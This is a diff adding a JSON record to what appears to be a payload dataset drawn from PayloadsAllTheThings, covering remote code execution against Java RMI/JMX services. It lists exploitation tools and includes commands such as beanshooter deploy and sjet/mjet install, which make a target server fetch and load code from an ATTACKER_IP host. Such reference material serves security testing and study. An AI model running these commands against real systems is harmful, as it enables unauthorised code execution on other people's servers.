@@ -1,0 +1,27 @@
+{
+  "id": "rce-e128625b59fe",
+  "category": "RCE",
+  "title": "README",
+  "description": "# Java RMI\n\n> Java RMI (Remote Method Invocation) is a Java API that allows an object running in one JVM (Java Virtual Machine) to invoke methods on an object running in another JVM, even if they're on different physical machines. RMI provides a mechanism for Java-based distributed computing.\n\n## Summary\n\n* [Tools](#tools)\n* [Detection](#detection)\n* [Methodology](#methodology)\n    * [RCE using beanshooter](#rce-using-beanshooter)\n    * [RCE using sjet/mjet](#rce-using-sjet-or-mjet)\n    * [RCE u",
+  "payloads": [
+    "* [siberas/sjet](https://github.com/siberas/sjet) - siberas JMX exploitation toolkit",
+    "* [mogwailabs/mjet](https://github.com/mogwailabs/mjet) - MOGWAI LABS JMX exploitation toolkit",
+    "* [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) - Java RMI Vulnerability Scanner",
+    "* [qtc-de/beanshooter](https://github.com/qtc-de/beanshooter) - JMX enumeration and attacking tool.",
+    "* Using [nmap](https://nmap.org/):",
+    "* Using [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser):",
+    "* Using [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)",
+    "set RHOSTS <IPs>",
+    "set RPORT <PORT>",
+    "* Deploy an MBean: `beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar --stager-url http://172.17.0.1:8000`",
+    "* The JMX server can connect to a http service that is controlled by the attacker",
+    "* Invoking the `getMBeansFromURL` method of the MBean instance, passing the webserver URL as parameter. The JMX service will connect to the http server and parse the MLet file.",
+    "Exploit the JMX using [siberas/sjet](https://github.com/siberas/sjet) or [mogwailabs/mjet](https://github.com/mogwailabs/mjet)",
+    "jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000",
+    "jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Java RMI/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
